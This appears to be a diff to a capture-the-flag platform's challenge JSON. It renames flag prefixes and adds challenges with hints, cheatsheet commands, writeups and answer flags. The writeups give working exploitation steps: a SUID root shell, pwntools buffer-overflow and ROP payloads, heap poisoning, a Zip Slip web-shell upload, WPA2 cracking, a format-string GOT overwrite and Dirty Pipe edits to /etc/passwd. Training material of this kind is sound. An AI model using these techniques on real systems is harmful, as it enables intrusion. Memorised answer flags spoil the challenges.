@@ -150,7 +150,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "You gained unprivileged shell access to an Ubuntu container. Enumerate system binaries with SUID bits or elevated Linux capabilities to spawn an interactive root shell.",
-    "flag": "CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}",
+    "flag": "flag{su1d_gtf0b1ns_r00t_pr1v3sc}",
     "file_url": "",
     "hints": [
       {
@@ -165,7 +165,7 @@
     "concept": "Linux Privilege Escalation, SUID, GTFOBins, Capabilities",
     "cheatsheet": "checksec --file=./target",
     "badge": "Easy Misc/O",
-    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}`"
+    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`"
   },
   {
     "id": "misc-8",
@@ -174,7 +174,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "A 64-bit ELF executable `vuln` reads 128 bytes into a 32-byte stack buffer using `gets()`. ASLR and stack canaries are disabled, and the binary contains an uncalled function `win()` at address `0x401176`. Overflow the return address to hijack execution.",
-    "flag": "CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}",
+    "flag": "flag{r3t2w1n_st4ck_b0f_c0ntr0l}",
     "file_url": "",
     "hints": [
       {
@@ -189,7 +189,7 @@
     "concept": "Buffer Overflow, Ret2Win, pwntools, x86-64 Stack Frame",
     "cheatsheet": "checksec --file=./target",
     "badge": "Medium Misc/O",
-    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}`"
+    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`"
   },
   {
     "id": "misc-9",
@@ -198,7 +198,7 @@
     "points": 450,
     "difficulty": "Hard",
     "description": "Target server runs with No-Execute (NX/DEP) enabled, preventing shellcode execution on the stack. Leak a libc address (`puts` GOT entry) to calculate libc base, then build a ROP chain to call `system('/bin/sh')`.",
-    "flag": "CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
+    "flag": "flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
     "file_url": "",
     "hints": [
       {
@@ -213,7 +213,7 @@
     "concept": "ROP, Ret2Libc, GOT Overwrite, ASLR Bypass, pwntools",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
+    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
   },
   {
     "id": "misc-10",
@@ -222,7 +222,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "An allocation note service allows allocating, editing, and freeing chunks. An off-by-one UAF allows corrupting chunk forward pointers. Bypass Glibc 2.35 safe linking (pointer mangling `L = (P >> 12) ^ Target`) to allocate a chunk over `__environ` and hijack control flow.",
-    "flag": "CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
+    "flag": "flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
     "file_url": "",
     "hints": [
       {
@@ -237,6 +237,150 @@
     "concept": "Heap Exploitation, Tcache Poisoning, Safe Linking, glibc 2.35",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
+    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
+  },
+  {
+    "id": "misc-11",
+    "title": "Zip Slip Path Traversal Exploitation (Level 1)",
+    "category": "Misc/OSINT",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "An automated homework grading server extracts student ZIP submissions without validating canonical file paths. Craft a malicious ZIP containing directory traversal sequences (`../../../../root/.ssh/authorized_keys`) to overwrite server files.",
+    "flag": "flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "Zip file headers allow relative paths containing `../`.",
+        "penalty": 10
+      },
+      {
+        "text": "Use python `zipfile` with custom `ZipInfo` where filename is `../../../../tmp/flag.txt`.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Zip Slip, Arbitrary File Overwrite, Archive Security, Path Traversal",
+    "cheatsheet": "python3 -c \"import zipfile; # craft zip with ../../ path\"",
+    "badge": "Archive Infiltrator",
+    "writeup": "1. Craft ZIP with filename `../../var/www/html/shell.php`.\n2. Submit ZIP to extraction endpoint.\n3. Access `shell.php` to execute commands and read flag.\n4. Flag: `flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}`"
+  },
+  {
+    "id": "misc-12",
+    "title": "Wi-Fi WPA2 PMKID Hashcat Cracking (Level 2)",
+    "category": "Misc/OSINT",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "Captured a Wi-Fi WPA2 PMKID from a wireless access point beacon without needing a full 4-way client handshake. Extract the PMKID hash line and crack it against rockyou.txt using Hashcat mode 22000.",
+    "flag": "flag{wpa2_pmk1d_h4shc4t_cr4ck3d}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "Convert PCAP to Hashcat format using `hcxpcapngtool -o hash.22000 capture.pcapng`.",
+        "penalty": 10
+      },
+      {
+        "text": "Run `hashcat -m 22000 hash.22000 rockyou.txt`.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Wireless Security, WPA2 PMKID, Hashcat 22000, hcxtools",
+    "cheatsheet": "hashcat -m 22000 wifi.hc22000 /usr/share/wordlists/rockyou.txt",
+    "badge": "Wi-Fi Cracker",
+    "writeup": "1. Extract PMKID using `hcxpcapngtool`.\n2. Run Hashcat mode 22000 against dictionary.\n3. Recovered password is the flag.\n4. Flag: `flag{wpa2_pmk1d_h4shc4t_cr4ck3d}`"
+  },
+  {
+    "id": "misc-13",
+    "title": "Flight ADS-B Transponder Route OSINT (Level 4)",
+    "category": "Misc/OSINT",
+    "points": 200,
+    "difficulty": "Medium",
+    "description": "An adversary fled the country on a private charter flight. Given an intercepted ADS-B transponder squawk code `7700` and ICAO 24-bit hex address `4B1234`, reconstruct the aircraft's flight path, departure runway, and arrival waypoint using FlightRadar24 and ADS-B Exchange archives.",
+    "flag": "flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "ICAO 24-bit addresses uniquely identify airframes worldwide.",
+        "penalty": 15
+      },
+      {
+        "text": "Search ADS-B Exchange historical tracker for the hex identifier on September 15, 2026.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Aviation OSINT, ADS-B Transponders, FlightRadar24, ICAO Identifiers",
+    "cheatsheet": "curl -s 'https://globe.adsbexchange.com/?icao=...'",
+    "badge": "Sky Tracker",
+    "writeup": "1. Look up ICAO hex address in ADS-B Exchange historical database.\n2. Trace radar breadcrumb logs to destination airport (Zamboanga International Airport / RPMZ).\n3. Flag: `flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}`"
+  },
+  {
+    "id": "misc-14",
+    "title": "Suncalc Shadow & Geolocation Calculation (Level 5)",
+    "category": "Misc/OSINT",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A covert photo shows a flagpole casting a shadow that is exactly 1.42 times its physical height at bearing 48 degrees northeast. Using Suncalc, calculate the solar altitude angle and determine the exact date and minute the photo was captured.",
+    "flag": "flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "Shadow length formula: $\\tan(\\theta) = \\frac{\\text{height}}{\\text{shadow}} = \\frac{1}{1.42} \\implies \\theta \\approx 35.1^\\circ$.",
+        "penalty": 15
+      },
+      {
+        "text": "Cross-reference solar azimuth and altitude for the latitude coordinates in Suncalc.org.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Shadow Analysis, Suncalc, Ephemeris Geolocation, Chronolocation",
+    "cheatsheet": "python3 -c \"import suncalc; # calculate solar azimuth & altitude\"",
+    "badge": "Solar Cartographer",
+    "writeup": "1. Compute solar elevation angle: $\\arctan(1 / 1.42) = 35.1^\\circ$.\n2. In Suncalc: find time when sun was at $35.1^\\circ$ altitude and opposite bearing (228 degrees azimuth).\n3. Reconstructed timestamp matches target flag format.\n4. Flag: `flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}`"
+  },
+  {
+    "id": "misc-15",
+    "title": "Format String Memory Arbitrary Write (%n) (Level 8)",
+    "category": "Misc/OSINT",
+    "points": 450,
+    "difficulty": "Hard",
+    "description": "A 64-bit networked daemon prints user greetings via `printf(user_input)`. The binary has partial RELRO and no PIE. Leverage the `%n` format specifier to overwrite a Global Offset Table (GOT) entry with the address of `system()`.",
+    "flag": "flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "`%n` writes the number of bytes printed so far into a pointer provided on the stack.",
+        "penalty": 20
+      },
+      {
+        "text": "Use pwntools `fmtstr_payload(offset, {got_puts: sym_system})` to generate the write payload.",
+        "penalty": 40
+      }
+    ],
+    "concept": "Format String Exploitation, Arbitrary Memory Write (%n), GOT Overwriting, pwntools",
+    "cheatsheet": "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x401150}))\"",
+    "badge": "Format Smasher",
+    "writeup": "1. Determine argument stack offset using `%p.%p.%p...`.\n2. Write exploit using pwntools `fmtstr_payload` targeting `puts@GOT`.\n3. Send payload; next call to `puts` spawns interactive shell.\n4. Flag: `flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}`"
+  },
+  {
+    "id": "misc-16",
+    "title": "Linux Dirty Pipe Kernel Privilege Escalation (Level 9)",
+    "category": "Misc/OSINT",
+    "points": 500,
+    "difficulty": "Hard",
+    "description": "Target Linux kernel version is 5.16.10, vulnerable to CVE-2022-0847 (Dirty Pipe). Exploit the uninitialized pipe buffer flags (`PIPE_BUF_FLAG_CAN_MERGE`) to overwrite read-only page cache pages, injecting a root password hash into `/etc/passwd`.",
+    "flag": "flag{d1rty_p1p3_cv3_2022_0847_r00t}",
+    "file_url": "",
+    "hints": [
+      {
+        "text": "Dirty Pipe allows overwriting cached file data in the page cache without write permissions.",
+        "penalty": 25
+      },
+      {
+        "text": "Splice file data into a pipe, then write attacker bytes into the pipe to overwrite page cache.",
+        "penalty": 50
+      }
+    ],
+    "concept": "Kernel Exploitation, CVE-2022-0847, Dirty Pipe, Page Cache Corruption",
+    "cheatsheet": "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 1 root::0:0...",
+    "badge": "Kernel Overlord",
+    "writeup": "1. Compile Dirty Pipe C exploit.\n2. Execute exploit targeting `/etc/passwd` to remove root password prompt.\n3. Spawn root shell with `su -`.\n4. Read `/root/flag.txt`.\n5. Flag: `flag{d1rty_p1p3_cv3_2022_0847_r00t}`"
   }
 ]
